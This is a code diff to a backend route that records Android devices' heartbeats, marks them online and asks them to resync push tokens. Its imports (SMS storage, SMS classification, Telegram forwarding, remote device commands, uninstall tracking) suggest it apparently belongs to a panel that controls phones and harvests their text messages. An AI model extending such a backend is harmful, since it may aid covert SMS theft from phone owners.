@@ -7,7 +7,7 @@ import MasterSms from "../models/MasterSms";
 import AdminModel from "../models/Admin";
 import wsService from "../services/wsService";
 import { sendCommandToDevice as fcmSendCommand } from "../services/fcmService";
-import { updateFcmToken, updateLastSeen, touchLastSeen } from "../services/deviceService";
+import { updateFcmToken, updateLastSeen, touchLastSeen, markDeviceOnline } from "../services/deviceService";
 import config from "../config";
 import { classifySms } from "../services/smsClassifier";
 import { sendTelegramMessage, sendTelegramMessages, type TelegramCategory } from "../services/telegramService";
@@ -210,7 +210,11 @@ router.put("/:deviceId/lastSeen", async (req: Request, res: Response) => {
     const battery = typeof req.body?.battery === "number" ? req.body.battery : -1;
     const doc = await updateLastSeen(deviceId, action, battery);
     try { wsService.notifyDeviceLastSeen(deviceId, { at: Date.now(), action, battery }); } catch {}
-    try { if (doc) wsService.broadcastDeviceUpsert(doc); } catch {}
+
+    // Mark device online — clears offline/uninstalled state
+    await markDeviceOnline(deviceId);
+    // Emit fresh doc so frontend gets updated fcmStatus
+    await emitDeviceUpsert(deviceId);
 
     // ── checkedAt: only update when action is "ping" (explicit Check Online) ──
     if (action === "ping") {
@@ -224,12 +228,7 @@ router.put("/:deviceId/lastSeen", async (req: Request, res: Response) => {
       logger.info("devices: checkedAt updated via ping", { deviceId });
     }
 
-    // FIX (Root Cause 1 — PRIMARY): 76% devices ka token missing tha.
-    // Backend FCM invalid-token error pe clearInvalidFcmToken() se token "" ho jaata tha.
-    // OEM battery optimization HeartbeatWorker ko kill kar deta tha → recovery nahi hoti thi.
-    // Ab: har lastSeen response mein resyncToken=true bhejo agar token empty hai.
-    // Android (LastSeenReporter) ye flag check karta hai aur turant forceResync() call karta hai.
-    // Ye har action pe fire hoga: heartbeat, sms_received, boot, fcm_received — OEM throttling bypass.
+    // Agar token missing hai to resyncToken=true bhejo taaki Android force-resync kare
     const noToken = !String((doc as any)?.fcmToken || "").trim();
     return res.json({ success: true, resyncToken: noToken });
   } catch (err: any) {
